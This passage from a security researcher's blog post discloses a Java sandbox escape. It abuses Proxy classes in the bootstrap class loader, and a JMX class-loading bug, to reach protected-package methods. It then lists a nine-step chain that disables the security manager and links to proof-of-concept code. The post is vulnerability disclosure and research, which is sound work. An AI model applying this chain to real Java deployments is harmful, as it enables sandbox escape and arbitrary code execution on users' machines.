generated proxy class will have all the fields from the targetClass. Because
the generated proxy class is not in a protected package user code can then call
<code>proxyClass.getFields()</code> which will give back the <code>java.lang.reflect.Field</code> object
and because the field is public call <code>Field#get</code> will succeed. The proxy class
successfully loads because it is defined the root class loader.</p>

<h2>Getting Access to Method objects for Interface Methods in Protected Packages</h2>

<p>This uses a similar vulnerability as above. You can think of the Proxy instance
as a machine that will convert Method objects into Method objects for a
particular interface. If you look at <code>proxyClass.getDeclaredMethods()</code> for
<code>com.sun.xml.internal.bind.v2.model.nav.Navigator</code> you will see something like:</p>

<pre><code>public final boolean $Proxy0.isFinal(java.lang.Object)
public final boolean $Proxy0.isArray(java.lang.Object)
..
</code></pre>

<p>If you call <code>$Proxy0.isFinal(java.lang.Object)</code> then it will convert this Method
into <code>Navigator.isFinal(java.lang.Object)</code> before passing it to the
<code>InvocationHandler</code>.</p>

<p>To access a <code>Method</code> on an interface in a protected package all you have to do is
create an <code>InvocationHandler</code> that will save the Method then invoke the
corresponding public method on the proxy class.</p>

<p>Once an attacker has access to the Method then they are free to invoke it
because the <code>Method</code> is public and no more access checks are performed.</p>

<h2>Exploit</h2>

<ol>
<li>We use the JMX class loading vulnerability to load the class
<code>"com.sun.xml.internal.bind.v2.model.nav.Navigator"</code>.</li>
<li>We then use the field reading vulnerability to read the <code>REFLECTION</code> field from
the interface.</li>
<li>We then use the interface method vulnerability to read the
<code>getDeclaredMethods(Object o)</code> method from the <code>Navigator</code> class.</li>
</ol>


<p>Now that we have a way of getting Methods from a protected Class
(<code>getDeclaredMethods</code>) and a way of loading protected classes (JMX vulnerability)
we can easily subvert the JVM sandbox. There is probably 100 ways of doing this
because once you can execute arbitrary static methods in the protected packages
it is game over for the JVM. We will use a technique similar to the one
disclosed in ZDI-13-159 in order to disable the sandbox except we will modify
it slightly so it only uses JDK 6 classes.</p>

<ol>
<li>We use <code>com.sun.xml.internal.bind.v2.ClassFactory#create(Class)</code> to create a
<code>sun.reflect.ReflectionFactory$GetReflectionFactoryAction</code></li>
<li>We use <code>com.sun.xml.internal.ws.api.server.InstanceResolver#createSingleton</code> to
create an <code>InstanceResolver</code> object</li>
<li>We use <code>com.sun.xml.internal.ws.api.server.InstanceResolver#createInvoker</code> to
create an <code>Invoker</code> object</li>
<li>We use <code>com.sun.xml.internal.ws.api.server.Invoker#invoke</code> to invoke
<code>AccessController#doPrivileged</code> with the <code>PrivilegedAction</code> in step 1 to create a
<code>ReflectionFactory</code> object.</li>
<li>We invoke <code>sun.reflect.ReflectionFactory#newField</code> with parameters that
correspond to the <code>Statement#acc</code> field</li>
<li>We invoke <code>sun.reflect.ReflectionFactory#newFieldAccessor</code> with the new field
object.</li>
<li>We create a <code>Statement</code> object that executes <code>System.setSecurityManager(null)</code>;</li>
<li>We invoke <code>sun.reflect.FieldAccessor#set(Object, Object)</code> with a <code>Statement</code>
object we have created and a <code>AccessControlContext</code> that gives us all permissions</li>
<li>We execute the <code>Statement</code> which disables the JVM security.</li>
</ol>


<h2>Exploit Java 6</h2>

<p>We use the same technique as above but we use the XSLT class loading hack
disclosed in ZDI-13-159 to load the classes because this works in Java 6.</p>

<h2>Testing (Java 7)</h2>

<p>The POC is available from <a href="https://github.com/benmmurphy/JavaPlayground/tree/master/ZDI-13-XXX/proxy_abuse7">Github</a></p>

<p>java -Djava.security.manager ProxyAbuse
or
appletviewer test.html</p>

<p>It will try and print the users home directory and execute an apple script that
will say some stuff.</p>

<h2>Testing (Java 6)</h2>

<p>The POC is available from <a href="https://github.com/benmmurphy/JavaPlayground/tree/master/ZDI-13-XXX/proxy_abuse6">Github</a></p>

<p>java -Djava.security.manager Harness
or
appletviewer test.html</p>

<p>It will try and print the users home directory and execute an apple script that
will say some stuff.</p>

<h2>Fixes</h2>

<p>User code probably shouldn&rsquo;t be able to load Proxy Classes in the bootstrap
class loader.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="2">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/07/06/postgresql-non-durable-reads/">Postgresql Non-Durable Reads</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/06/07/voltdb-command-logging-quirks/">VoltDB Command Logging Quirks</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/06/02/fsync-db-lock-contention/">FSync DB Lock Contention</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/08/09/mechanically-solving-avalon/">Mechanically Solving Avalon</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/08/09/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - Ben Murphy -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'benmmurphy';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>



  <script type="text/javascript">
    (function() {
      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
      script.src = 'https://apis.google.com/js/plusone.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
    })();
  </script>



  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
```